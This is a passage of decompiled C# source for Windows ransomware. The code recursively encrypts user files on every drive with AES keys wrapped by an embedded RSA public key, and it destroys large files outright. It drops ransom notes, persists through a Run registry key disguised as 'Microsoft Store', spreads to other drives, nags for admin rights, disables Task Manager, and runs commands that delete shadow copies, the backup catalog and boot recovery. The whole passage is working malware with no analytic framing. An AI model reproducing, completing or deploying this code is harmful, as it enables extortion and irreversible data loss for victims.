		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					try
					{
						fileInfo.Attributes = FileAttributes.Normal;
					}
					catch
					{
					}
					string text = CreatePassword(40);
					if (fileInfo.Length < 1368709120)
					{
						if (checkDirContains(files[i]))
						{
							string keyRSA = RSA_Encrypt(text, rsaKey());
							AES_Encrypt(files[i], text, keyRSA);
						}
					}
					else
					{
						AES_Encrypt_Large(files[i], text, fileInfo.Length);
					}
					if (flag)
					{
						flag = false;
						string path = location + "/" + droppedMessageTextbox;
						string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
						if (!File.Exists(path) && location != folderPath)
						{
							File.WriteAllLines(path, messages);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				try
				{
					new DirectoryInfo(directories[j]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>xvW/2XulSY6VQICrMlzK2NYXCFc0N/kCW6Q2pxQHJgeSLzrCAR2QQlnEzSorN+0ae/99DPql+wWKqvObhL6F1iT+YvmeMjQh2P4GU3zSUUHYGn5OWxPZ4Nm7mdcI3Il4ftdo0hOIaxehTe5jr9PZPuM7wcv4icL7mUokwJE63caXWGYrSYLEfB4OM7B5I55cDKMRY+e7w7qzEGnaK6fJvA2cx/FgEd8SEKQMJjyT9VYxoyvgwYHB+/QcjzQa1m4BQ3A4mP1nnlrSNHTp5S5CHexToU1WP2g2eXDRSnFGxz99Z+JzMg3EC2EinafzlYewjZzBaIT1KLFKJ4qbTMozAQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Small(string inputFile, string passwordBytes)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(passwordBytes);
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream stream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.Zeros;
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(stream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.CopyTo(cryptoStream);
			fileStream.Flush();
			cryptoStream.Flush();
			fileStream.Close();
			cryptoStream.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
